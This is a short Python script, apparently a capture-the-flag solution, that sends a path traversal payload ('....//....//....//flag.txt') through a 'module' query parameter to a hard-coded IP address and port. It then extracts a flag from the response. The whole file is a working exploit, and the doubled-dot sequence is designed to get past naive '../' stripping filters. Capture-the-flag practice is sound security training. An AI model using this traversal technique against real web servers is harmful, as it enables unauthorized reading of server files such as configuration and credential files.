import re
import sys

import requests


def main() -> None:
    base = sys.argv[1] if len(sys.argv) > 1 else "http://47.99.147.34:18941/"
    payload = "....//....//....//flag.txt"

    resp = requests.get(base, params={"module": payload}, timeout=10)
    match = re.search(r"flag\{[^\r\n<]+}", resp.text)

    if not match:
        raise SystemExit("flag not found")

    print(match.group(0))


if __name__ == "__main__":
    main()
